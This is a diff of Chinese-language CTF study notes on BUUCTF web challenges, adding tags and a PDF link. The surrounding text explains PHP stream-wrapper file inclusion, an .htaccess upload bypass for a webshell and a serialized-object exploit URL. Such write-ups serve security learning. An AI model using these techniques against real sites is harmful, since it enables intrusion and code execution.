@@ -11,6 +11,7 @@ php://filter用于读取源码(以base64编码输出)：
 php://filter/convert.base64-encode/resource=文件路径
 php://input用于执行php代码：
 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。
+关于===php伪协议===：[[【精选】文件包含支持的伪协议_data伪协议-CSDN博客.pdf]]
 [GXYCTF2019]Ping Ping Ping
 #命令执行漏洞
 使用拼接符让其执行多条命令
@@ -246,6 +247,7 @@ echo md5("046eec27-a62c-4a05-b12a-bc7cc476b8b4".$scookie)
 Unicode欺骗
 题有问题，没有源码
 [MRCTF2020]你传你🐎呢
+#命令执行漏洞 
 直接上传图片马，妄图修改后缀不可行，其同时过滤了文件后缀以及MIME,上传.htaccess，将名为shit的文件视为php执行：
 ```
 <FilesMatch "shit" >
@@ -269,6 +271,7 @@ var_dump(file('/flag'))
 ```
 第一次上传后发现根目录有/flag.第二次拿到flag
 [ZJCTF 2019]NiZhuanSiWei
+#Include文件包含漏洞
 进入，查看源码：
 ```php
 <?php  
@@ -372,4 +375,4 @@ echo serialize($a);
 得到序列化后的Flag对象，构造payload:
 `[a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}](http://a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;})`
 查看源码，拿到flag。
-关于===php伪协议===：
+关于===php伪协议===：[[【精选】文件包含支持的伪协议_data伪协议-CSDN博客.pdf]]
